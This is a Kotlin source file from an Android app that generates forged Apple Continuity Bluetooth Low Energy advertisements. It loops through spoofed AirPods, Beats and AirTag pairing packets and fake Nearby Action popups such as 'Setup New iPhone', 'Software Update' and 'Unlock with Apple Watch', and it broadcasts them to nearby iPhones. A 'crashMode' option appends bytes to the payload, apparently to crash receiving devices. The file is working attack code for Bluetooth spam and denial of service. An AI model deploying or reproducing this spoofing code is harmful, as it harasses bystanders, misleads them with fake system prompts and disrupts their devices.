package com.droid.dolphy

import android.bluetooth.le.AdvertiseData
import android.os.Build
import android.util.Log
import java.util.HashMap
import java.util.Random
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors


class ContinuitySpam(private val type: ContinuityType, private val crashMode: Boolean = false) : Spammer {

    private var blinkRunnable: Runnable? = null
    @Volatile
    private var isSpamming = false

    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private val rand = Random()

    val devices: Array<ContinuityDevice> = when (type) {
        ContinuityType.DEVICE -> arrayOf(
            ContinuityDevice("0x0E20", "AirPods Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x1420", "AirPods Pro 2nd Gen", ContinuityType.DEVICE),
            ContinuityDevice("0x2420", "AirPods Pro 2nd Gen USB-C", ContinuityType.DEVICE),
            ContinuityDevice("0x2820", "AirPods 4 ANC", ContinuityType.DEVICE),
            ContinuityDevice("0x2920", "AirPods 4", ContinuityType.DEVICE),
            ContinuityDevice("0x2B20", "AirPods Max USB-C", ContinuityType.DEVICE),
            ContinuityDevice("0x2C20", "Beats Powerbeats Pro 2", ContinuityType.DEVICE),
            ContinuityDevice("0x0620", "Beats Solo 3", ContinuityType.DEVICE),
            ContinuityDevice("0x0A20", "AirPods Max", ContinuityType.DEVICE),
            ContinuityDevice("0x1020", "Beats Flex", ContinuityType.DEVICE),
            ContinuityDevice("0x0055", "AirTag", ContinuityType.DEVICE),
            ContinuityDevice("0x0030", "Hermes AirTag", ContinuityType.DEVICE),
            ContinuityDevice("0x0220", "AirPods", ContinuityType.DEVICE),
            ContinuityDevice("0x0F20", "AirPods 2nd Gen", ContinuityType.DEVICE),
            ContinuityDevice("0x1320", "AirPods 3rd Gen", ContinuityType.DEVICE),
            ContinuityDevice("0x0320", "Powerbeats 3", ContinuityType.DEVICE),
            ContinuityDevice("0x0B20", "Powerbeats Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x0C20", "Beats Solo Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x1120", "Beats Studio Buds", ContinuityType.DEVICE),
            ContinuityDevice("0x0520", "Beats X", ContinuityType.DEVICE),
            ContinuityDevice("0x0920", "Beats Studio 3", ContinuityType.DEVICE),
            ContinuityDevice("0x1720", "Beats Studio Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x1220", "Beats Fit Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x1620", "Beats Studio Buds+", ContinuityType.DEVICE),
            ContinuityDevice("0x2520", "Beats Solo 4", ContinuityType.DEVICE),
            ContinuityDevice("0x2620", "Beats Solo Buds", ContinuityType.DEVICE),
            ContinuityDevice("0x2F20", "Powerbeats Fit", ContinuityType.DEVICE),
        )
        ContinuityType.NOTYOURDEVICE -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            DEVICE_DATA.map { (key, value) ->
                ContinuityDevice("0x$key", "$value (NOT YOUR)", ContinuityType.NOTYOURDEVICE)
            }.toTypedArray()
        } else {
            emptyArray()
        }
        ContinuityType.ACTION -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            NEARBY_ACTIONS.map { (key, value) ->
                ContinuityDevice("0x$key", value, ContinuityType.ACTION)
            }.toTypedArray()
        } else {
            emptyArray()
        }
    }

    override fun start() {
        executor.execute {
            if (devices.isEmpty()) {
                Log.w(TAG, "No Continuity devices for mode $type")
                return@execute
            }
            val bluetoothAdvertiser = BluetoothAdvertiser()
            isSpamming = true
            var loop = 0

            while (loop <= Helper.MAX_LOOP && isSpamming) {
                val device = devices[rand.nextInt(devices.size)]
                val deviceVal = device.value.removePrefix("0x").uppercase()

                val payloadBytes = when (device.deviceType) {
                    ContinuityType.DEVICE -> {
                        Helper.convertHexToByteArray(
                            buildTutozzDevicePayload(deviceVal)
                        )
                    }
                    ContinuityType.NOTYOURDEVICE -> {
                        val color = pickRandomColorForDevice(deviceVal)
                        buildProximityPairPayload("01", deviceVal, color)
                    }
                    ContinuityType.ACTION -> {
                        buildNearbyActionPayload(deviceVal)
                    }
                }

                val data = AdvertiseData.Builder()
                    .addManufacturerData(0x004C, payloadBytes)
                    .build()

                val scanResponse = AdvertiseData.Builder()
                    .addManufacturerData(
                        0x004C,
                        Helper.convertHexToByteArray("0000000000000000000000000000"),
                    )
                    .build()

                try {
                    bluetoothAdvertiser.advertise(data, scanResponse)
                    blinkRunnable?.run()
                    BleSpamRuntime.trackSentPackets()
                } catch (e: Exception) {
                    Log.w(TAG, "advertise: ${e.message}")
                }

                try {
                    Thread.sleep(getRandomDelayMs())
                } catch (_: InterruptedException) {
                    break
                }
                try {
                    bluetoothAdvertiser.stopAdvertising()
                } catch (_: Exception) {
                }
                loop++
            }
            isSpamming = false
            try {
                bluetoothAdvertiser.stopAdvertising()
            } catch (_: Exception) {
            }
        }
    }

    override fun isSpamming(): Boolean = isSpamming

    override fun stop() {
        isSpamming = false
    }

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable

    private fun getRandomDelayMs(): Long {
        val base = Helper.delay.coerceIn(10, 2000)
        return (base + rand.nextInt((base / 2).coerceAtLeast(1) + 1)).toLong()
    }

    private fun toHexByte(b: Int): String = String.format("%02X", b and 0xFF)

    private fun getRandomBudsBatteryLevelHex(): String {
        val level = ((rand.nextInt(10) shl 4) + rand.nextInt(10)) and 0xFF
        return toHexByte(level)
    }

    private fun getRandomChargingCaseBatteryLevelHex(): String {
        val level = (((rand.nextInt(8) % 8) shl 4) + (rand.nextInt(10) % 10)) and 0xFF
        return toHexByte(level)
    }

    private fun getRandomLidOpenCounterHex(): String {
        return toHexByte(rand.nextInt(256))
    }

    private fun getRandomHexBytes(length: Int): String {
        val bytes = ByteArray(length)
        rand.nextBytes(bytes)
        return bytes.joinToString("") { String.format("%02X", it.toInt() and 0xFF) }
    }

    private fun pickRandomColorForDevice(deviceIdNoPrefix: String): String {
        return DEVICE_COLORS[deviceIdNoPrefix]?.randomOrNull() ?: COLOR_KEY_DEFAULT
    }

    
    private fun buildTutozzDevicePayload(deviceIdHex: String): String {
        val buds = getRandomBudsBatteryLevelHex()
        val charging = getRandomChargingCaseBatteryLevelHex()
        val lid = getRandomLidOpenCounterHex()
        val color = pickRandomColorForDevice(deviceIdHex)
        return buildString {
            append(CONTINUITY_TYPE)
            append(PAYLOAD_SIZE)
            append(deviceIdHex)
            append(color)
            append(buds)
            append(charging)
            append(lid)
            append(STATUS)
        }
    }

    private fun buildProximityPairPayload(prefixHex: String, deviceIdHex: String, colorHex: String?): ByteArray {
        val buds = getRandomBudsBatteryLevelHex()
        val charging = getRandomChargingCaseBatteryLevelHex()
        val lid = getRandomLidOpenCounterHex()

        val isAirTag = deviceIdHex == "0055" || deviceIdHex == "0030"
        val prefix = if (isAirTag) "05" else prefixHex
        val color = if (prefix == "01") (colorHex ?: COLOR_KEY_DEFAULT) else "00"

        val payloadHex = buildString {
            append(CONTINUITY_TYPE)
            append(PAYLOAD_SIZE)
            append(prefix)
            append(deviceIdHex)
            append(STATUS)
            append(buds)
            append(charging)
            append(lid)
            append(color)
            append("00")
            append(getRandomHexBytes(16))
        }
        return Helper.convertHexToByteArray(payloadHex)
    }

    private fun buildNearbyActionPayload(actionHex: String): ByteArray {
        var flag = "C0"
        when (actionHex) {
            "21" -> flag = "40"
            "20" -> if (rand.nextBoolean()) flag = "BF"
            "09" -> if (rand.nextBoolean()) flag = "40"
        }
        val authTag = getRandomHexBytes(3)
        var payloadHex = buildString {
            append(CONTINUITY_TYPE_NEARBY_ACTION)
            append(PAYLOAD_SIZE_NEARBY_ACTION)
            append(flag)
            append(actionHex)
            append(authTag)
        }
        if (crashMode) {
            payloadHex += "000010" + getRandomHexBytes(3)
        }
        return Helper.convertHexToByteArray(payloadHex)
    }

    companion object {
        private const val TAG = "ContinuitySpam"
        private const val COLOR_KEY_DEFAULT = "00"
        
        private const val CONTINUITY_TYPE = "07"
        private const val PAYLOAD_SIZE = "19"
        private const val STATUS = "55"
        private const val CONTINUITY_TYPE_NEARBY_ACTION = "0F"
        private const val PAYLOAD_SIZE_NEARBY_ACTION = "05"

        private val DEVICE_COLORS = HashMap<String, Array<String>>().apply {
            put("0E20", arrayOf("00"))
            put("0220", arrayOf("00"))
            put("0F20", arrayOf("00"))
            put("1320", arrayOf("00"))
            put("1420", arrayOf("00"))
            put("2420", arrayOf("00"))
            put("0055", arrayOf("00"))
            put("0030", arrayOf("00"))
            put("0A20", arrayOf("00", "02", "03", "0F", "11"))
            put("1020", arrayOf("00", "01"))
            put("0620", arrayOf("00", "01", "06", "07", "08", "09", "0E", "0F", "12", "13", "14", "15", "1D", "20", "21", "22", "23", "25", "2A", "2E", "3D", "3E", "3F", "40", "5B", "5C"))
            put("0320", arrayOf("00", "01", "0B", "0C", "0D", "12", "13", "14", "15", "17"))
            put("0B20", arrayOf("00", "02", "03", "04", "05", "06", "0B", "0D"))
            put("0C20", arrayOf("00", "01"))
            put("1120", arrayOf("00", "01", "02", "03", "04", "06"))
            put("0520", arrayOf("00", "01", "02", "05", "1D", "25"))
            put("0920", arrayOf("00", "01", "02", "03", "18", "19", "25", "26", "27", "28", "29", "42", "43"))
            put("1720", arrayOf("00", "01"))
            put("1220", arrayOf("00", "01", "02", "03", "04", "05", "06", "07", "08", "09"))
            put("1620", arrayOf("00", "01", "02", "03", "04"))
            put("2520", arrayOf("00", "01", "02", "03"))
            put("2620", arrayOf("00", "01", "02", "03", "04"))
            put("2F20", arrayOf("00", "01", "02", "03"))
        }

        private val DEVICE_DATA = HashMap<String, String>().apply {
            put("0E20", "AirPods Pro")
            put("0A20", "AirPods Max")
            put("0220", "AirPods")
            put("0F20", "AirPods 2nd Gen")
            put("1320", "AirPods 3rd Gen")
            put("1420", "AirPods Pro 2nd Gen")
            put("2420", "AirPods Pro 2nd Gen USB-C")
            put("2820", "AirPods 4 ANC")
            put("2920", "AirPods 4")
            put("2B20", "AirPods Max USB-C")
            put("2C20", "Beats Powerbeats Pro 2")
            put("1020", "Beats Flex")
            put("0620", "Beats Solo 3")
            put("0320", "Powerbeats 3")
            put("0B20", "Powerbeats Pro")
            put("0C20", "Beats Solo Pro")
            put("1120", "Beats Studio Buds")
            put("0520", "Beats X")
            put("0920", "Beats Studio 3")
            put("1720", "Beats Studio Pro")
            put("1220", "Beats Fit Pro")
            put("1620", "Beats Studio Buds+")
            put("2520", "Beats Solo 4")
            put("2620", "Beats Solo Buds")
            put("2F20", "Powerbeats Fit")
            put("0055", "AirTag")
            put("0030", "Hermes AirTag")
        }

        private val NEARBY_ACTIONS = HashMap<String, String>().apply {
            put("13", "AppleTV AutoFill")
            put("27", "AppleTV Connecting...")
            put("20", "Join This AppleTV?")
            put("19", "AppleTV Audio Sync")
            put("1E", "AppleTV Color Balance")
            put("09", "Setup New iPhone")
            put("02", "Transfer Phone Number")
            put("0B", "HomePod Setup")
            put("01", "Setup New AppleTV")
            put("06", "Pair AppleTV")
            put("0D", "HomeKit AppleTV Setup")
            put("2B", "AppleID for AppleTV?")
            put("05", "Apple Watch")
            put("24", "Apple Vision Pro")
            put("2F", "Connect to other Device")
            put("21", "Software Update")
            put("2E", "Unlock with Apple Watch")
            put("25", "AirDrop Sidecar")
            put("2C", "Vision Pro Setup")
        }
    }
}

